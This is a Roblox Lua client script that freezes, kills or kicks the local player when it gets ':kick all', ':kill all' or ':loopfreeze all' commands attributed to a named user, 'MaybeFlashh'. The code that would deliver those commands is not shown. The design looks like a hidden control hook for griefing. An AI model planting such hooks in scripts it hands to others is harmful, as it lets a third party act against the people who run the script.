Players = game:GetService("Players")
LocalPlayer = Players.LocalPlayer

-- Freeze state
freezeActive = false
freezeThread = nil
characterAddedConn = nil

-- Start a continuous freeze loop for a given character
function startFreezeLoop(character)
    if freezeThread then
        freezeThread = nil  -- old coroutine will stop when freezeActive becomes false
    end
    freezeThread = coroutine.create(function()
        while freezeActive and character and character.Parent do
            local humanoid = character:FindFirstChild("Humanoid")
            if humanoid then
                humanoid.PlatformStand = true
                humanoid.WalkSpeed = 0
                humanoid.JumpPower = 0
            end
            task.wait(0.1)
        end
    end)
    coroutine.resume(freezeThread)
end

-- Called whenever the local player's character respawns
local function onCharacterAdded(character)
    if freezeActive then
        startFreezeLoop(character)
    end
end

-- Enable the loop freeze for the local player
local function enableFreeze()
    if freezeActive then return end
    freezeActive = true

    local character = LocalPlayer.Character
    if character then
        startFreezeLoop(character)
    end

    -- Watch for new characters (respawn)
    if characterAddedConn then
        characterAddedConn:Disconnect()
    end
    characterAddedConn = LocalPlayer.CharacterAdded:Connect(onCharacterAdded)
end

-- Process a command received from "MaybeFlashh"
local function processCommand(command)
    if command == ":kick all" then
        LocalPlayer:Kick("Kicked by MaybeFlashh")
    elseif command == ":kill all" then
        local character = LocalPlayer.Character
        local humanoid = character and character:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.Health = 0
        end
    elseif command == ":loopfreeze all" then
        enableFreeze()
    end
end

